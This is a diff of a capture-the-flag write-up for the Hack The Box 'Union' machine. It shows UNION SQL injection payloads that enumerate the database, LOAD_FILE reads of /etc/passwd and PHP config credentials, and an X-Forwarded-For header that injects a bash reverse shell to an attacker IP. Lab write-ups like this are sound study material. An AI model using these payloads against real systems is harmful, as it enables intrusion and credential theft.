@@ -5,7 +5,7 @@ The key skills to focus on for this task are identifying SQLi vulnerabilities an
 For the privilege escalation portion, we’ll focus on identifying interesting points of entry and quickly understanding backend (PHP) scripts to spot potential exploit vectors.
 # User
 As always we start with an NMAP scan:
-```
+```bash
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sV -A 10.10.11.128
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 21:47 CET
@@ -63,6 +63,8 @@ I make an assumption that there is a Web Application Firewall (WAF) which blocks
 
 - `or` is blocked
 
+## SQLi
+
 So after some thinking the SQL query should be really simple:
 
 ```sql
@@ -80,58 +82,65 @@ I highlighted the text we entered to better understand what part we inject.
 This indeed works out:
 
 ![[Union5.png]]
-
+### Enumerating DB
 Now that we’ve identified and confirmed the SQLi vulnerability, we can proceed with the standard process of querying the database and enumerating its elements step by step. I’ll cover this part quickly since it’s relatively straightforward. You can reference the SQL UNION Injection Cheat Sheet for additional details: [[Union Injection]]
 
-```
-Query:
+**Query:**
+```mysql
 ' union select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA;-- -
-
-Output:
+```
+**Output:**
+```
 mysql,information_schema,performance_schema,sys,november
 ```
 
 The only non-default database is `november`, let’s explore it:
 
-```
-Query:
-
+**Query:**
+```mysql
 ' union select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where table_schema='november';-- -
-
-Output:
-
+```
+**Output:**
+```
 flag,players
 ```
 
 Two tables, let’s look at them both:
-
-```
-Query:
+**Query:**
+```mysql
 ' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_schema='flag';-- -
-
-Output:
+```
+**Output:**
+```
 one
-
-Query:
+```
+**
+Query:**
+```mysql
 ' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where table_name='players';-- -
-
-Output:
+```
+**Output:**
+```
 player
-
 ```
 
 Each table has only one column. Don’t be frustrated by it, let’s look at it:
 
-```
-Query:
+**Query:**
+```mysql
 ' union select * from november.players;-- -
+```
+**Output:**
+```
+ippsec
+```
 
-Output:
-
-Query:
+**Query:**
+```mysql
 ' union select * from november.flag;-- -
-
-Output:
+```
+**Output:**
+```
 UHC{F1rst_5tep_2_Qualify}
 ```
 
@@ -140,25 +149,27 @@ UHC{F1rst_5tep_2_Qualify}
 After submitting the flag the firewall lets us to connect to `ssh`:
 
 ![[Union6.png]]
-
+### File read
 This is great, now we “only” need valid credentials. We can get the user which runs the DB, this is probably the `ssh` user since the app and the server looks pretty simple:
 
-```
-Query:
+**Query:**
+```mysql
 ' union select user();-- -
-
-Output:
+```
+**Output:**
+```
 uhc@localhost
 ```
 
 Okay, according to our page we can also read local files, let’s try:
 
-```
-Query:
+**Query:**
+```mysql
 ' union select LOAD_FILE("/etc/passwd");-- -
-
+```
 Output:
-oot:x:0:0:root:/root:/bin/bash
+```
+root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -201,11 +212,12 @@ Now before we switch to some other techniques, we need to exploit this file read
 
 We need to make guesses where some files could be located, but we can at least make educated guesses. At this stage I really want to find the source files of this app, so the first location I would look for it is `/var/www/html/` and we can look for `challenge.php` :
 
-```
-Query:
+**Query:**
+```mysql
 ' union select LOAD_FILE("/var/www/html/challenge.php");-- -
-
-Output:
+```
+**Output:**
+```
 <?php
   require('config.php');
   $_SESSION['Authenticated'] = False;
@@ -223,12 +235,12 @@ Output:
 
 Well who could think, we indeed found the location, now let’s try to guess some config files which could store credentials:
 
-```
-Query:
-
+**Query:**
+```mysql
 ' union select LOAD_FILE("/var/www/html/config.php");-- -
-
-Output:
+```
+**Output:**
+```
 <?php
   session_start();
   $servername = "127.0.0.1";
@@ -268,10 +280,10 @@ It worked and we got user access!
 > Tipp: Just keep im mind that here due to simplisity of the challenge the setup is very easy: the web app is located in guessable directory and the DB credentials are the same as for ssh. In the real world or in more advanced challenges this could be different and might require us to fuzz web directories and the credentials at the end could be not useful for us at all.
 
 # Root
-
+## Command Injection
 Taking another look on the web app, the file `firewall.php` is especially interesting:
 
-```bash
+```php
 uhc@union:/var/www/html$ cat firewall.php 
 <?php
 require('config.php');
@@ -311,7 +323,7 @@ if (!($_SESSION['Authenticated'])) {
 
 We can see that we can inject command into HTTP header `HTTP_X_FORWARDED_FOR`, so let’s capture the request to the page `/firewall.php` and add the header with a shell to it:
 
-```bash
+```
 GET /firewall.php HTTP/1.1
 Host: 10.10.11.128
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -323,6 +335,7 @@ Connection: close
 Cookie: PHPSESSID=uiuoc99cjt4mqh65f15c18itn3
 Upgrade-Insecure-Requests: 1
 X-Forwarded-For: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1';
+
 
 ```
 
@@ -342,8 +355,8 @@ www-data@union:~/html$
 ```
 
 Someone might ask why didn’t we get a shell as root, since we injected a command with `sudo` at the beginning? In this case we broke the command line with `;` and started another one, so since the user who runs it is `www-data`, we got a `www-data` shell.
-
-But understanding this, we can clearly see that www-data can run iptables as root, and there is a really nice article explaining how we can use it to get root:
+## Sudo Permissions Abuse 
+We can clearly see that www-data can run `iptables` as root, and there is a really nice article explaining how we can use it to get root:
 
 [Shielder - A Journey From `sudo iptables` To Local Privilege Escalation](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)
 
